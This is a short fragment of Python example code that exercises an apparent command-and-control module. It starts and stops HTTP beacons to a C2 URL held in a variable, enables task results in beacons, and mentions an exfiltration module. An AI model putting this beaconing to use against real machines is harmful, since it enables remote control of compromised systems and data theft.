    c2_module = CommandControl(nexus_instance=mock_nexus_instance) 
    # Enable sending results back in this test
    c2_module.update_config({"modules": {"command_control": {"include_task_results_in_beacon": True}}}) 

    # ... (rest of the example tests can remain largely the same, 
    #      they primarily test beacon start/stop and tasking reception) ...
    # ... (The Exfiltration module example now becomes more relevant for testing the queuing) ...

    print("\n--- Starting beacon again for cleanup test ---")
    start_result_cleanup = c2_module.run_operation({
        "operation": "start_http_beacon",
        "details": {"c2_url": test_c2_url, "interval_seconds": 300, "beacon_id": "cleanup_beacon"}
    })
    print(f"Start result: {start_result_cleanup.get('status')}")

    print("\n--- Cleaning up any remaining beacons via stop_beaconing() ---")
    c2_module.stop_beaconing() 
    time.sleep(2) 
    print("\nExample usage finished.") 